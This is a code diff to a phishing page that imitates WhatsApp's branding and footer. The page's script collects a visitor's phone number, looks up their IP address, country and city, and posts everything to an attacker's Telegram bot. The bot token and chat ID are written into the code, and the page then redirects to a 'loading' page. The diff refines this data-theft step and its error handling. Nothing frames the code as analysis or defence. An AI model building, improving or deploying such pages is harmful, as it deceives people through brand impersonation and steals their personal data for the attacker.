@@ -122,7 +122,9 @@
   </style>
 </head>
 <body>
-  <div class="navbar">🌿 Green Navbar</div>
+  <div class="navbar">
+    🌿 Green Navbar
+  </div>
 
   <div class="container">
     <img src="DSxOAUB0raA.png" alt="Second Image" class="sub-image">
@@ -136,18 +138,19 @@
 
   <footer>
     <div class="footer-links">
-      <p>Use WhatsApp</p>
-      <p>Features</p>
-      <p>WhatsApp Web</p>
-      <p>Download</p>
-      <p>About Us</p>
-      <p>Business</p>
-      <p>Security</p>
-      <p>Privacy & Terms</p>
-      <p>Get in Touch</p>
-      <p>Contact Us</p>
-      <p>Facebook | X (Twitter)</p>
-      <p>Meta Logo</p>
+        <p>Use WhatsApp</p>
+        <p>Features</p>
+        <p>WhatsApp Web</p>
+        <p>Download</p>
+        <p>About Us</p>
+        <p>Business</p>
+        <p>Security</p>
+        <p>Privacy & Terms</p>
+        <p>Get in Touch</p>
+        <p>Contact Us</p>
+        <p>Facebook | X (Twitter)</p>
+        <p>Meta Logo</p>
+        <p>© 2025 WhatsApp</p>
     </div>
     <div class="footer-bottom">© 2025 WhatsApp</div>
   </footer>
@@ -186,12 +189,12 @@
           const country = data.country_name;
           const city = data.city;
 
-          const message = `📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}`;
+          const message = `New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}`;
 
           const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY"; // Replace with your bot token
           const chatId = "7196613507";     // Replace with your chat ID
 
-          return fetch(`https://api.telegram.org/bot7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY/sendMessage`, {
+          fetch(`https://api.telegram.org/bot7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY/sendMessage`, {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
@@ -200,17 +203,20 @@
               chat_id: chatId,
               text: message
             })
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (!data.ok) {
+              console.error("Telegram API error:", data);
+              alert(`Telegram API error: ${data.description}`);
+            } else {
+              window.location.href = "loading.html";
+            }
+          })
+          .catch(err => {
+            console.error("Fetch error:", err);
+            alert("An error occurred. Please try again.");
           });
-        })
-        .then((res) => {
-          if (!res.ok) {
-            throw new Error("Telegram API failed");
-          }
-          window.location.href = "loading.html";
-        })
-        .catch((err) => {
-          console.error("Error:", err);
-          alert("Something went wrong. Try again.");
         });
     });
   </script>
